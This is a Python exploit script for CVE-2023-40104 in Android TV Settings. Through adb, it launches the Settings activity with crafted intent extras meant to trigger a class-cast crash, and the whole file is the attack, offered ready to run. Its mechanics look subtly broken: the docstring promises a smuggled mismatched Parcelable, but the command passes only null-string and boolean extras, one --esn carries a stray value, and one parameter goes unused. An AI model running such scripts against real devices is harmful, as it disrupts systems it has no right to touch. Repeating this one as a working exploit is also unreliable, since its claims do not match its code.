#!/usr/bin/env python3
"""CVE-2023-40104 — Android TV Settings. Intent that smuggles a Parcelable
with a mismatched type, causing a class-cast in Settings."""
import subprocess, sys

def exploit(host=None, extra=None):
    am = ["adb"]
    if host: am += ["-s", host]
    cmd = am + ["shell", "am", "start", "-n",
                "com.android.settings/.Settings",
                "--esn", "com.android.settings.extra.EXTRA",
                "--esn", "com.android.settings.extra.INTENT", "android.intent.action.MAIN",
                "--ez", "com.android.settings.extra.MISMATCH", "true"]
    r = subprocess.run(cmd, capture_output=True, text=True)
    print(r.stdout or r.stderr)
    return r.returncode == 0

def main():
    host = sys.argv[1] if len(sys.argv) > 1 else None
    exploit(host)

if __name__ == "__main__":
    main()
